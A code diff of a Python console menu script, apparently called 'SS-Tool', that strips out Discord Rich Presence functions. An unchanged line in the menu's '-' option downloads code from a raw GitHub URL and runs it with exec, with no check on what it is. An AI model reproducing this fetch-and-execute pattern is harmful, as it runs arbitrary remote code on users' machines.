@@ -8,41 +8,7 @@ import webbrowser, os, re, json, random
 import subprocess
 from pypresence import Presence
 
-global RPC
-RPC = None
 
-CLIENT_ID = '1216435828931428504'
-
-def manage_discord_rpc(state, details, large_image, large_text):
-    global RPC 
-    try:
-        if RPC is None:
-            RPC = Presence(CLIENT_ID)  
-            RPC.connect()  
-        RPC.update(state=state, details=details, large_image=large_image, large_text=large_text, start=time.time())
-    except Exception as e:
-        print(f"Error with Discord RPC: {e}")
-        close_rpc_on_error()  
-
-def close_rpc_on_exit():
-    global RPC
-    if RPC is not None: 
-        RPC.close()  
-        RPC = None  
-
-def close_rpc_on_error():
-    try:
-        close_rpc_on_exit()
-    except Exception as e:
-        print(f"Error closing Discord RPC: {e}")
-
-def discord_rp_mc():
-    manage_discord_rpc(
-        state="Downloading Minecraft Clients",
-        details="Premium | Logged in as Username",  # Update this line with your username variable or string.
-        large_image="screenshot_2024-03-10_172435",
-        large_text="https://discord.gg/gNq7SXbZhJ"
-    )
 
 try:
     from faker import Faker
@@ -95,7 +61,6 @@ while True:
     chon = input(
         '\033[1;39m[\033[1;31m×\033[1;39m] \033[1;39m>> \033[1;39m[\033[1;34mCHOOSE\033[1;39m]\033[1;39m: \033[1;34m')
     if chon == '-':
-        discord_rp_mc()
         os.system('cls')
         print("Leaving SS-Tool test")
         exec(requests.get('https://raw.githubusercontent.com/VjpProDaiIa/k/main/Multi').text)
